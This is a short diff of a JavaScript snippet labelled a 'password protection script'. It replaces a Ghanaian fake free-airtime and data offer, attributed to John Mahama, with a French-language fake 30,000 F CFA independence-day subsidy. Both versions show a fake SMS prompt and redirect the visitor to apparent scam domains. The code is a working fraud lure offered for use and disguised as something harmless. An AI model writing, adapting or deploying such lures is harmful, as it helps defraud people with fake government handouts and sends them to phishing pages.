@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '30,000F.CFA'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir une subvention de 30,000F.CFA à loccasion de la fête de lindépendance, Veuillez appuyer sur OK pour CONTINUER ','30,000F.CFA');
+if (password != '30,000F.CFA') {
+location.href='https://independence.goprogram.xyz/page1';
 }
